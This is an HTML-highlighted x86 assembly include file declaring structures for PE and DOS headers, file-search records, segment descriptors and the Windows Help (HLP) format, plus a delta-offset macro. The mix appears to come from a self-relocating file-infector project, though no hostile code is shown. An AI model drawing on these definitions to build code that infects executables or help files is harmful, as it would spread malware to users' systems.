</span><span class="sc5">PP_TOTALLENGTH</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PP_PREFIXLENGTH</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PP_ELEMENTS</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">BCS_WANSI</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; USE WINDOWS ANSI SET</span><span class="sc0">

</span><span class="sc5">_FILETIME</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">DWLOWDATETIME</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DWHIGHDATETIME</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">DOS_TIME</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">DT_TIME</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DT_DATE</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">DWFILEATTRIBUTES</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FTCREATIONTIME</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">_FILETIME</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FTLASTACCESSTIME</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">_FILETIME</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FTLASTWRITETIME</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">_FILETIME</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">NFILESIZEHIGH</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">NFILESIZELOW</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DWRESERVED0</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DWRESERVED1</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CFILENAME</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; INCLUDES NULL</span><span class="sc0">
</span><span class="sc5">CALTERNATEFILENAME</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">   </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; INCLUDES NULL</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">_TYPE</span><span class="sc0">       </span><span class="sc9">RECORD</span><span class="sc0">  </span><span class="sc5">RES</span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">DPL</span><span class="sc4">:</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">SYSORNOT</span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">STYPE</span><span class="sc4">:</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">SEL</span><span class="sc0">     </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">SEL_LIMIT_LOW</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SEL_BASE_LOW</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SEL_BASE_LOWH</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SEL_TYPE</span><span class="sc0">    </span><span class="sc5">_TYPE</span><span class="sc0">   </span><span class="sc4">&lt;&gt;</span><span class="sc0">
</span><span class="sc5">SEL_LIMIT_HIGH</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SEL_BASE_HIGH</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">    

</span><span class="sc5">GOFF</span><span class="sc0">        </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">LBL</span><span class="sc4">,</span><span class="sc5">DELTA</span><span class="sc0">
        </span><span class="sc9">IFNB</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc5">DELTA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">LBL</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START_CODE32</span><span class="sc4">+</span><span class="sc5">END_CODE16</span><span class="sc4">-</span><span class="sc5">DELTA</span><span class="sc0">
        </span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc5">LBL</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START_CODE32</span><span class="sc4">+</span><span class="sc5">END_CODE16</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">BREAK</span><span class="sc0">       </span><span class="sc9">MACRO</span><span class="sc0">
        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;PE FILES SECTION</span><span class="sc0">

</span><span class="sc5">PE_FLAG_NOT_FIXUP</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">PE_FLAG_EXECUTABLE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">PE_FLAG_32BIT</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">100H</span><span class="sc0">
</span><span class="sc5">PE_FLAG_DLL</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2000H</span><span class="sc0">

</span><span class="sc5">OT_FLAG_CODE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">20H</span><span class="sc0">
</span><span class="sc5">OT_FLAG_IDATA</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">40H</span><span class="sc0">
</span><span class="sc5">OT_FLAG_UDATA</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">80H</span><span class="sc0">
</span><span class="sc5">OT_FLAG_DISCARDABLE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">02000000H</span><span class="sc0">
</span><span class="sc5">OT_FLAG_NOTCACHED</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">04000000H</span><span class="sc0">
</span><span class="sc5">OT_FLAG_NONPAGED</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">08000000H</span><span class="sc0">
</span><span class="sc5">OT_FLAG_SHARED</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">10000000H</span><span class="sc0">
</span><span class="sc5">OT_FLAG_EXECUTE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">20000000H</span><span class="sc0">
</span><span class="sc5">OT_FLAG_READ</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">40000000H</span><span class="sc0">
</span><span class="sc5">OT_FLAG_WRITE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">80000000H</span><span class="sc0">

</span><span class="sc5">DOS_HEADER</span><span class="sc0">  </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">DOSH_SIGNATURE</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; 'MZ'</span><span class="sc0">
</span><span class="sc5">DOSH_CBLP</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_CP</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_CRLC</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_CPARHDR</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_MINALLOC</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_MAXALLOC</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_SS</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_SP</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_CSUM</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_IP</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_CS</span><span class="sc0">     </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_LFARLC</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; RELOCATION TABLE ADDRESS</span><span class="sc0">
</span><span class="sc5">DOSH_OVNO</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_RES</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DOSH_OEMID</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_OEMINFO</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DOSH_RES2</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DOSH_LFANEW</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; NEW EXE HEADER ADDRESS</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">SD</span><span class="sc0">      </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">SD_RVA</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SD_SIZE</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">PE_HEADER</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">PEH_SIGNATURE</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;PE,0,0</span><span class="sc0">
</span><span class="sc5">PEH_CPUTYPE</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;&lt;=162H</span><span class="sc0">
</span><span class="sc5">PEH_NUMOFOBJECT</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_TIMEDATE</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_COFFPOINTER</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_COFFSIZE</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_NTHSIZE</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_FLAGS</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_MAGIC</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_LINKMAJOR</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_LINKMINOR</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_CODESIZE</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_IDATASIZE</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_UDATASIZE</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_ENTRYPOINT</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_CODEBASE</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_DATABASE</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_IMAGEBASE</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_OBJALIGN</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_FILEALIGN</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_OSMAJOR</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_OSMINOR</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_USERMAJOR</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_USERMINOR</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_SUBMAJOR</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_SUBMINOR</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_RESERVED1</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_IMAGESIZE</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_HEADERSIZE</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_FILECRC</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_SUBSYSTEM</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_DLLFLAGS</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_STACKRES</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_STACKCOM</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_HEAPRES</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_HEAPCOM</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_LOADFLAGS</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_NUMRVA</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;10H</span><span class="sc0">
</span><span class="sc5">PEH_EXPORT</span><span class="sc0">  </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_IMPORT</span><span class="sc0">  </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_RESOURCE</span><span class="sc0">    </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_EXEPTION</span><span class="sc0">    </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_SECURITY</span><span class="sc0">    </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_FIXUP</span><span class="sc0">   </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_DEBUG</span><span class="sc0">   </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_DESCRIPT</span><span class="sc0">    </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_MACHINE</span><span class="sc0"> </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_TLSRVA</span><span class="sc0">  </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_LCONFIG</span><span class="sc0"> </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_RESERVED2</span><span class="sc0">   </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_IATRVA</span><span class="sc0">  </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_BOUNDIMPORT</span><span class="sc0"> </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_RESERVED3</span><span class="sc0">   </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PEH_RESERVED4</span><span class="sc0">   </span><span class="sc5">SD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">OBJECT_TABLE</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">OT_NAME</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OT_VIRTSIZE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">OT_RVA</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">OT_PHYSICALSIZE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">OT_PHYSICALOFF</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">OT_RESERVED</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CH</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OT_FLAGS</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">;WINDOWS HELP FILE (HLP)</span><span class="sc0">

</span><span class="sc5">HLP_MAGIC</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">35F3FH</span><span class="sc0">
</span><span class="sc5">HLP_SH_MAGIC</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">36CH</span><span class="sc0">
</span><span class="sc5">ID_CONFIG</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">HLP_START</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">HLP_START_MAGIC</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;35F3FH</span><span class="sc0">
</span><span class="sc5">HLP_START_DIRECTORYSTART</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;OFFSET OF FILE_HEADER OF INTERNAL DIRECTORY</span><span class="sc0">
</span><span class="sc5">HLP_START_FIRSTFREEBLOCK</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;OFFSET OF FREE_HEADER OR -1L IF NO FREE LIST</span><span class="sc0">
</span><span class="sc5">HLP_START_ENTIREFILESIZE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;SIZE OF ENTIRE HELP FILE IN BYTES</span><span class="sc0">
</span><span class="sc1">;CHAR HELPFILECONTENT[ENTIREFILESIZE-16]   THE REMAINDER OF THE HELP FILE</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">FILE_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FILE_HEADER_RESERVEDSPACE</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;SIZE RESERVED INCLUDING FILE_HEADER</span><span class="sc0">
</span><span class="sc5">FILE_HEADER_USEDSPACE</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;SIZE OF INTERNAL FILE IN BYTES</span><span class="sc0">
</span><span class="sc5">FILE_HEADER_FILEFLAGS</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;NORMALLY 4</span><span class="sc0">
</span><span class="sc1">;DB FILECONTENT DUP (USEDSPACE)  THE BYTES CONTAINED IN THE INTERNAL FILE</span><span class="sc0">
</span><span class="sc1">;DB FREESPACE DUP (RESERVEDSPACE-USEDSPACE-9)</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">SYSTEM_HEADER</span><span class="sc0">   </span><span class="sc9">STRUC</span><span class="sc0">       </span><span class="sc1">;|SYSTEM</span><span class="sc0">
</span><span class="sc5">SYSTEM_HEADER_MAGIC</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;36CH</span><span class="sc0">
</span><span class="sc5">SYSTEM_HEADER_MINOR</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;HELP FILE FORMAT VERSION NUMBER</span><span class="sc0">
                </span><span class="sc1">;15 = HC30 WINDOWS 3.0 HELP FILE</span><span class="sc0">
                </span><span class="sc1">;21 = HC31 WINDOWS 3.1 HELP FILE</span><span class="sc0">
                </span><span class="sc1">;27 = WMVC/MMVC MEDIA VIEW FILE</span><span class="sc0">
                </span><span class="sc1">;33 = MVC OR HCW 4.00 WINDOWS 95</span><span class="sc0">
</span><span class="sc5">SYSTEM_HEADER_MAJOR</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;1</span><span class="sc0">
</span><span class="sc5">SYSTEM_HEADER_GENDATE</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">;HELP FILE CREATED SECONDS AFTER 1.1.1980, OR 0</span><span class="sc0">
</span><span class="sc5">SYSTEM_HEADER_FLAGS</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;USE MINOR AND FLAGS TO FIND OUT HOW THE HELP FILE WAS COMPRESSED:</span><span class="sc0">
</span><span class="sc1">;MINOR &lt;= 16         NOT COMPRESSED, TOPICBLOCKSIZE 2K</span><span class="sc0">
</span><span class="sc1">;MINOR &gt; 16      FLAGS=0: NOT COMPRESSED,  TOPICBLOCKSIZE 4K</span><span class="sc0">
</span><span class="sc1">;            FLAGS=4: LZ77 COMPRESSED, TOPICBLOCKSIZE 4K</span><span class="sc0">
</span><span class="sc1">;            FLAGS=8: LZ77 COMPRESSED, TOPICBLOCKSIZE 2K</span><span class="sc0">
</span><span class="sc1">;ADDITIONALLY THE HELP FILE MAY USE PHRASE COMPRESSION (OLDSTYLE OR HALL).</span><span class="sc0">
</span><span class="sc1">;IF MINOR IS 16 OR LESS, THE HELP FILE TITLE FOLLOWS THE SYSTEMHEADER:</span><span class="sc0">
</span><span class="sc1">;HELPFILETITLE DB ? DUP (?) - ASCIZ STRING</span><span class="sc0">
</span><span class="sc1">;IF MINOR IS ABOVE 16, ONE OR MORE SYSTEMREC RECORDS FOLLOW INSTEAD UP TO THE</span><span class="sc0">
</span><span class="sc1">;INTERNAL END OF THE |SYSTEM FILE:</span><span class="sc0">
</span><span class="sc1">;SYSTEM_HEADER_RECORDTYPE DW    ?   ;TYPE OF DATA IN RECORD</span><span class="sc0">
